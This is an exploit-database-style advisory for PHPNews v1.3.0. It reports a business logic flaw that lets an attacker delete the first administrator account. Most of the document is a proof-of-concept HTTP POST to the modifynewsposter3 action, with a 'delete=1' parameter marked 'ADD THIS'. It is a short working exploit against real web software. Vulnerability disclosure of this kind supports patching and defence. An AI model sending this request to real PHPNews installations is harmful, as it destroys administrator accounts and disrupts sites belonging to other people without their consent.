# Exploit Title: PHPNews v1.3.0 - Business Logic Error(BLE)
## Date: 1/4/2024
## Vendor Homepage: https://sourceforge.net/projects/newsphp/files/PHPNews%201._/PHPNews%201.3.0/phpnews_1-3-0.zip/download
## Tested on: Debian Linux, Apache, Mysql
## Vendor: PHPNews
## Version: v1.3.0
## Exploit Description:
## PHPNews v1.3.0 suffers from BLE - Business Logic Error Vulnerability allowing attackers to delete the first admin account

## -----------------------------------------------POC-------------------------------------------------------------------
```
POST /index.php?action=modifynewsposter3 HTTP/1.1
...

id=1&newusername=admin&username=admin&password=&password2=&email=admin%40test.com&avatar=&language=en_GB&access=admin&delete=1(ADD THIS)
```